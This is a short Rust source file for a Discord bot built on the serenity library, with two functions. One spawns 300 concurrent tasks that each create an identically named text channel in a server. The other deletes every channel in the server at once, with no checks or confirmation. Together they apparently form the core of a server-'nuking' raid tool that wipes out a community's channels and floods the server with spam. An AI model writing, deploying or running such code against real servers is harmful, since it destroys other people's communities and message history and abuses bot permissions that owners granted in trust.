use serenity::all::CreateChannel;
use serenity::prelude::*;
use serenity::model::prelude::*;
use tokio::task;

pub async fn create_channels(name: &str, ctx: &Context, guild_id: GuildId) {
    let futures: Vec<_> = (0..300).map(|i| {
        let http = ctx.http.clone();
        let guild_id = guild_id.clone();
        let channel_builder = CreateChannel::new(name).kind(ChannelType::Text);

        task::spawn(async move {
            if let Err(err) = guild_id
                .create_channel(&http, channel_builder)
                .await
            {
                eprintln!("Error creating channel {}: {:?}", i, err);
            }
        })
    }).collect();

    for future in futures {
        let _ = future.await;
    }
}

pub async fn delete_channels(ctx: &Context, guild_id: GuildId) {
    let guild = guild_id.to_partial_guild(&ctx.http).await.unwrap();

    let futures: Vec<_> = guild.channels(&ctx.http).await.unwrap().values().map(|channel| {
        let http = ctx.http.clone();
        let channel_id = channel.id;
        task::spawn(async move {
            if let Err(err) = channel_id.delete(&http).await {
                eprintln!("Error deleting channel {}: {:?}", channel_id, err);
            }
        })
    }).collect();

    for future in futures {
        let _ = future.await;
    }
}